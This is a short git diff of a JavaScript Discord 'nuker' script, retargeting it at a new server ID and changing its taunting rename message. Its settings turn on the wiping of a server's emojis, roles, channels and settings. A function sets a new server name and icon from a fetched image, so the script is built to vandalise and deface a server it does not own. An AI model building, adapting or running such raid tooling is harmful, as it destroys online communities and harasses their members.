@@ -1,6 +1,6 @@
 /***************************************/
-let guildID = "808661332937015316"
-let newservername = "NUKED L !!"
+let guildID = "940973055163908147"
+let newservername = "get nuked like imagine - get nuked by raidial - also stop making fun of trans people you dumby get nuked"
 
 let emojis = true;
 let roles = true;
@@ -8,7 +8,7 @@ let channels = true;
 let serversettings = true;
 
 let kickmembers = false;
-let banmembers = true;
+let banmembers = false;
 
 /***************************************/
 
@@ -184,7 +184,7 @@ function getData(url, callback) {
 
 function serverchanger()
 {
-    var url = 'https://cdn.discordapp.com/attachments/807354930225741845/808077040095330344/uweqnknown.png' // feel free to change this
+    var url = 'https://cdn.discordapp.com/attachments/1059967915614543904/1079909018077769869/th_1.jpg' // feel free to change this
 
     getData(url, function(data_) {
             var payload = {name: newservername, icon: data_,description: null, region: "southafrica", verification_level: 0};
